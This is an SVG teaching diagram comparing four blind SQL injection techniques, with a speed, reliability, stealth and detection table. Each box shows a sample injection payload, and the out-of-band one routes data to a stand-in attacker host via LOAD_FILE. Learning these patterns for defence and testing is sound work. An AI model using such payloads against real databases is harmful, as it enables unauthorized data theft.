<ns0:svg xmlns:ns0="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif">
  <ns0:defs>
    <ns0:marker id="arrow" markerWidth="17.7778" markerHeight="12.6" refX="16" refY="6.3" orient="auto">
      <ns0:polygon points="0,18 6.2222,0" fill="#4a90e2" />
    </ns0:marker>
  </ns0:defs>
  <ns0:text x="615.015" y="51.8919" text-anchor="middle" font-size="27.334" font-weight="bold" fill="#333">Blind SQL Injection Techniques</ns0:text>
  <ns0:rect x="51.2512" y="103.7838" width="546.68" height="121.0811" rx="8.5419" fill="#e8f4f8" stroke="#4a90e2" stroke-width="3.4168" />
  <ns0:text x="324.5913" y="147.027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="#4a90e2">Boolean-Based Blind</ns0:text>
  <ns0:text x="324.5913" y="178.1622" text-anchor="middle" font-size="17.0838" fill="#333">Different response for TRUE vs FALSE</ns0:text>
  <ns0:text x="324.5913" y="204.1081" text-anchor="middle" font-size="17.0838" fill="#666" font-family="monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</ns0:text>
  <ns0:rect x="632.0988" y="103.7838" width="546.68" height="121.0811" rx="8.5419" fill="#fff3cd" stroke="#ffc107" stroke-width="3.4168" />
  <ns0:text x="905.4388" y="147.027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="#e6a800">Time-Based Blind</ns0:text>
  <ns0:text x="905.4388" y="178.1622" text-anchor="middle" font-size="17.0838" fill="#333">SLEEP/WAITFOR delays on TRUE</ns0:text>
  <ns0:text x="905.4388" y="204.1081" text-anchor="middle" font-size="17.0838" fill="#666" font-family="monospace">1' AND SLEEP(5)-- (5s delay)</ns0:text>
  <ns0:rect x="51.2512" y="259.4595" width="546.68" height="121.0811" rx="8.5419" fill="#f8d7da" stroke="#dc3545" stroke-width="3.4168" />
  <ns0:text x="324.5913" y="302.7027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="#dc3545">Error-Based</ns0:text>
  <ns0:text x="324.5913" y="333.8378" text-anchor="middle" font-size="17.0838" fill="#333">Force errors that leak data</ns0:text>
  <ns0:text x="324.5913" y="359.7838" text-anchor="middle" font-size="17.0838" fill="#666" font-family="monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</ns0:text>
  <ns0:rect x="632.0988" y="259.4595" width="546.68" height="121.0811" rx="8.5419" fill="#d4edda" stroke="#28a745" stroke-width="3.4168" />
  <ns0:text x="905.4388" y="302.7027" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="#28a745">Out-of-Band (OOB)</ns0:text>
  <ns0:text x="905.4388" y="333.8378" text-anchor="middle" font-size="17.0838" fill="#333">DNS/HTTP to attacker server</ns0:text>
  <ns0:text x="905.4388" y="359.7838" text-anchor="middle" font-size="17.0838" fill="#666" font-family="monospace">LOAD_FILE('\\\\attacker.com\\...')</ns0:text>
  <ns0:rect x="102.5025" y="449.7297" width="1025.0251" height="190.2703" rx="8.5419" fill="#e8f4f8" stroke="#4a90e2" stroke-width="2.5626" />
  <ns0:text x="615.015" y="492.973" text-anchor="middle" font-size="20.5005" font-weight="bold" fill="#333">Technique Comparison</ns0:text>
  <ns0:text x="239.1725" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="#4a90e2">Speed</ns0:text>
  <ns0:text x="478.345" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="#4a90e2">Reliability</ns0:text>
  <ns0:text x="734.6012" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="#4a90e2">Stealthiness</ns0:text>
  <ns0:text x="973.7737" y="536.2162" text-anchor="middle" font-size="17.0838" font-weight="bold" fill="#4a90e2">Detection</ns0:text>
  <ns0:text x="239.1725" y="579.4595" text-anchor="middle" font-size="17.0838" fill="#333">Boolean: Fast</ns0:text>
  <ns0:text x="478.345" y="579.4595" text-anchor="middle" font-size="17.0838" fill="#333">Boolean: High</ns0:text>
  <ns0:text x="734.6012" y="579.4595" text-anchor="middle" font-size="17.0838" fill="#333">Time: Low</ns0:text>
  <ns0:text x="973.7737" y="579.4595" text-anchor="middle" font-size="17.0838" fill="#333">OOB: Hardest</ns0:text>
  <ns0:text x="239.1725" y="614.0541" text-anchor="middle" font-size="17.0838" fill="#333">Time: Slow</ns0:text>
  <ns0:text x="478.345" y="614.0541" text-anchor="middle" font-size="17.0838" fill="#333">OOB: Medium</ns0:text>
  <ns0:text x="734.6012" y="614.0541" text-anchor="middle" font-size="17.0838" fill="#333">Boolean: Medium</ns0:text>
  <ns0:text x="973.7737" y="614.0541" text-anchor="middle" font-size="17.0838" fill="#333">Error: Easiest</ns0:text>
</ns0:svg>